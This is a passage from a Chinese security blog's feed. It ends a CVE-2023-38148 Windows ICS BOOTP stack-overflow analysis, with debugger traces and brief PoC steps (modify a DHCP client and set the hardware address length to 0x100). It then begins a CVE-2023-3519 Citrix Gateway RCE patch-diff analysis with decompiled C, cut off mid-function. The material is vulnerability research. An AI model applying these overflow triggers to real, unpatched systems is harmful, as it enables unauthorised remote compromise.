0000000e`3487f380 00007ff9`c0017797 ipnathlp!DhcpProcessBootpMessage+0x5ea
0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0x123
0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644
0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f
0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca
0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456
0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14
0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21
&lt;/code>&lt;/pre>&lt;p>在调试器中可以看到，执行memcpy时长度参数为0x64，继续运行则触发了栈溢出，进程异常退出。&lt;/p>
&lt;pre tabindex="0">&lt;code>0:005&amp;gt; g
Breakpoint 9 hit
ipnathlp!DhcpAddArpEntry+0x184:
00007ff9`c0012570 e83db80600 call ipnathlp!memcpy (00007ff9`c007ddb2)
0:005&amp;gt; rr8
r8=0000000000000064
0:005&amp;gt; g
STATUS_STACK_BUFFER_OVERRUN encountered
(1858.3b4): Break instruction exception - code 80000003 (first chance)
KERNELBASE!UnhandledExceptionFilter+0x7c:
00007ff9`ec55dd3c cc int 3
0:005&amp;gt; k
Child-SP RetAddr Call Site
0000000e`34b7efa0 00007ff9`c007d096 KERNELBASE!UnhandledExceptionFilter+0x7c
0000000e`34b7f0c0 00007ff9`c007d229 ipnathlp!_raise_securityfailure+0x1a
0000000e`34b7f0f0 00007ff9`c0012600 ipnathlp!_report_gsfailure+0x169
0000000e`34b7f180 00007ff9`c0016766 ipnathlp!DhcpAddArpEntry+0x214
0000000e`34b7f260 00007ff9`c0017797 ipnathlp!DhcpProcessBootpMessage+0x5ea
0000000e`34b7f360 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0x123
0000000e`34b7f420 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644
0000000e`34b7f480 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f
0000000e`34b7f4b0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca
0000000e`34b7f4f0 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456
0000000e`34b7f7f0 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14
0000000e`34b7f820 00000000`00000000 ntdll!RtlUserThreadStart+0x21
0:005&amp;gt; g
ntdll!NtWaitForWorkViaWorkerFactory+0x14:
00007ff9`eeb70aa4 c3 ret
&lt;/code>&lt;/pre>&lt;p>wireshrk中可以看到数据包协议为Bootp。
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-38148-windows-ics-eop.zh-cn.assets/20230918152845.png" />&lt;/p>
&lt;p>PoC参考
&lt;a href="https://github.com/samueldotj/dhcp-client" target="_blank">简单实现的DHCP Client&lt;/a>并将option 53注释，将 &lt;code>Hardware address length&lt;/code>改为0x100。
这个栈溢出长度和内容均为内容可控&lt;/p>
&lt;h3 id="小结">小结&lt;/h3>
&lt;p>这个漏洞起源于memcpy时src和len参数均来源于数据包内，为用户可控，导致攻击者可以通过设置过长长度触发memcpy越界写入，触发时的漏洞函数为处理BOOTP协议，这个协议是DHCP协议前身，DHCP兼容这个协议，在处理Bootp消息时，没有检查长度导致在复制mac时出错。&lt;/p>
&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://bbs.kanxue.com/thread-278835.htm" target="_blank">https://bbs.kanxue.com/thread-278835.htm&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/preparing-to-debug-the-service-application#-enabling-the-debugging-of-the-initialization-code" target="_blank">https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/preparing-to-debug-the-service-application#-enabling-the-debugging-of-the-initialization-code&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-09-18T16:18:40+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2023-3519 Cirtix Gateway RCE分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/</link><pubDate>Thu, 27 Jul 2023 10:48:40 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>Citrix ADC 及 Citrix Gateway 中存在缓冲区溢出漏洞，未授权的攻击者可以通过发送特殊请求触发漏洞，造成RCE。&lt;/p>
&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;p>NetScaler ADC 、NetScaler Gateway 13.1 &amp;lt; 13.1-49.13
NetScaler ADC 、NetScaler Gateway 13.0 &amp;lt; 13.0-91.13
NetScaler ADC 13.1-FIPS &amp;lt; 13.1-37.159
NetScaler ADC 12.1-FIPS &amp;lt; 12.1-55.297
NetScaler ADC 12.1-NDcPP &amp;lt; 12.1-55.297&lt;/p>
&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;p>申请开发者试用，配置Citrix Gateway
&lt;img alt="aa" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-3519-Cirtix-Gateway-RCE.zh-cn.assets/3.png" />&lt;/p>
&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;p>根据国外安全研究员研究，该漏洞存在于&lt;code>/netscaler/nsppe&lt;/code>文件内，diff修复前和修复后的&lt;code>nsppe&lt;/code>，主要修改了&lt;code>ns_aaa_gwtest_get_event_and_target_names&lt;/code>等几个函数
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-3519-Cirtix-Gateway-RCE.zh-cn.assets/1.png" />&lt;/p>
&lt;p>转到&lt;code>ns_aaa_gwtest_get_event_and_target_names&lt;/code>函数，对比修复和未修复的代码，主要在调用&lt;code>ns_aaa_saml_url_decode&lt;/code>函数时对v29添加了校验。
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-3519-Cirtix-Gateway-RCE.zh-cn.assets/2.png" />&lt;/p>
&lt;p>跟进&lt;code>ns_aaa_saml_url_decode&lt;/code>函数，进入&lt;code>ns_aaa_saml_url_decode_inner&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">ns_aaa_saml_url_decode&lt;/span>(&lt;span style="color:#66d9ef">__int64&lt;/span> a1, &lt;span style="color:#66d9ef">__int64&lt;/span> a2, &lt;span style="color:#66d9ef">__int64&lt;/span> a3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">ns_aaa_saml_url_decode_inner&lt;/span>(a1, a2, a3, &lt;span style="color:#ae81ff">1LL&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在&lt;code>ns_aaa_saml_url_decode_inner&lt;/code>函数中a1是一个char指针，指向了http请求的url，在do while循环时遍历a1数组，当当前a1指向的字符是%，则获取到该字符后面两个字符通过&lt;code>datatable_ascii2bin&lt;/code>得到对应的字符并写入到v4指向的数组内，实际上这里是url解码操作，解码后写入v4数组。
如果当前字符不是%则判断是不是+号，是+号则在v4数组内写入空格。两个都不是则直接写入到v4内，可以看出这块代码是在对传入的字符串判断是否为url编码如果是则进行url解码，如果不是则直接写入v4数组。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">ns_aaa_saml_url_decode_inner&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a1, _BYTE &lt;span style="color:#f92672">*&lt;/span>a2, &lt;span style="color:#66d9ef">int&lt;/span> a3, &lt;span style="color:#66d9ef">int&lt;/span> a4)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _BYTE &lt;span style="color:#f92672">*&lt;/span>v4; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v5; &lt;span style="color:#75715e">// r8
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> v6; &lt;span style="color:#75715e">// bl
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v7; &lt;span style="color:#75715e">// r9
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> v8; &lt;span style="color:#75715e">// r10
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> v9; &lt;span style="color:#75715e">// r11
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">LODWORD&lt;/span>(v4) &lt;span style="color:#f92672">=&lt;/span> (_DWORD)a2;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( a3 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>a1[a3];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> a2;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>a1 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;%&amp;#39;&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span>)(a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&lt;/span> v5 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v8 &lt;span style="color:#f92672">=&lt;/span> a1[&lt;span style="color:#ae81ff">1&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int8&lt;/span>)(v8 &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">48&lt;/span>) &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">9u&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v7;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int8&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>v7 &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">48&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0xAu&lt;/span> &lt;span style="color:#f92672">||&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int8&lt;/span>)((v9 &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">97&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">6u&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v9 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">53&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> a1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span>)(a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>) &lt;span style="color:#f92672">&amp;gt;=&lt;/span> v5 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> a1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v8 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> a1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>a4 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> a1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">=&lt;/span> datatable_ascii2bin[(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int8&lt;/span>)v7[&lt;span style="color:#ae81ff">2&lt;/span>]] &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span> &lt;span style="color:#f92672">*&lt;/span> datatable_ascii2bin[(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int8&lt;/span>)v7[&lt;span style="color:#ae81ff">1&lt;/span>]];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a1 &lt;span style="color:#f92672">=&lt;/span> v7 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_4;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> ( v6 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;+&amp;#39;&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>a1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_4;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>a1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">=&lt;/span> v6;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_4:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>v4;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span>)a1 &lt;span style="color:#f92672">&amp;lt;&lt;/span> v5 );
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)((_DWORD)v4 &lt;span style="color:#f92672">-&lt;/span> (_DWORD)a2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在循环中，写入的数组来源于传入的参数a2，并且do while循环结束是通过判断&lt;code>a1 &amp;lt; v5&lt;/code>，&lt;code>v5 = &amp;amp;a1[a3];&lt;/code>a1是传入的char数组，a3是传入的int。向上追溯调用参数来源。
&lt;code>ns_aaa_saml_url_decode&lt;/code>函数的v5最终来源于传入的a1参数，a2为传入的参数，v25来源于&lt;code>*(a1+174)&lt;/code>。不难猜测a1应为一个结构体指针，该指针指向的结构体中存储了指向存储请求url的char数组及该数组的长度，该段代码为解析url的各个参数，并根据参数不同进行的操作。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">ns_aaa_gwtest_get_event_and_target_names&lt;/span>(&lt;span style="color:#66d9ef">__int64&lt;/span> a1, &lt;span style="color:#66d9ef">__int64&lt;/span> a2, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v3; &lt;span style="color:#75715e">// r13d
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v4; &lt;span style="color:#75715e">// rbx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v5; &lt;span style="color:#75715e">// r12
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v6; &lt;span style="color:#75715e">// r14d
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v7; &lt;span style="color:#75715e">// r13
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v8; &lt;span style="color:#75715e">// r12
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v9; &lt;span style="color:#75715e">// r8d
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v10; &lt;span style="color:#75715e">// r10
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int16&lt;/span> v11; &lt;span style="color:#75715e">// ax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v12; &lt;span style="color:#75715e">// rcx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v13; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v14; &lt;span style="color:#75715e">// ecx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">bool&lt;/span> v15; &lt;span style="color:#75715e">// cf
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v16; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v17; &lt;span style="color:#75715e">// rcx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v19; &lt;span style="color:#75715e">// r14d
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v20; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v21; &lt;span style="color:#75715e">// ecx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v22; &lt;span style="color:#75715e">// r13d
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v23; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v24; &lt;span style="color:#75715e">// edx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v25; &lt;span style="color:#75715e">// rdx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v26; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v27; &lt;span style="color:#75715e">// [rsp+0h] [rbp-50h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v28; &lt;span style="color:#75715e">// [rsp+18h] [rbp-38h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v29; &lt;span style="color:#75715e">// [rsp+20h] [rbp-30h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v3 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int16&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">174&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v27 &lt;span style="color:#f92672">=&lt;/span> v3 &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">17&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v3 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> a3;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0LL&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1441793&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0LL&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_7;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v8 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">36&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v29 &lt;span style="color:#f92672">=&lt;/span> v8 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">17&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> a3;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)&lt;span style="color:#a6e22e">strncmp&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;event=&amp;#34;&lt;/span>, v8 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">17&lt;/span>, &lt;span style="color:#ae81ff">6LL&lt;/span>) )
